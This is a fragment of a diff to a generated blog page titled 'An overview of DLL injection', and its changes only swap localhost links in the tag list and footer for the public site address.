       An overview of DLL injection
     </h1>
@@ -848,7 +916,7 @@ Also, the target process we want to inject our DLL into might not be even runnin
 
   <footer class="post-footer">
     <ul class="post-tags">
-      <li><a href="http://localhost:1313/tags/dll-injection/">Dll-Injection</a></li>
+      <li><a href="https://connar.github.io/tags/dll-injection/">Dll-Injection</a></li>
     </ul>
 
   </footer>
@@ -856,7 +924,7 @@ Also, the target process we want to inject our DLL into might not be even runnin
     </main>
     
 <footer class="footer">
-        <span>&copy; 2025 <a href="http://localhost:1313/">Journal of Connar</a></span> · 
+        <span>&copy; 2025 <a href="https://connar.github.io/">Journal of Connar</a></span> · 
 
     <span>
         Powered by
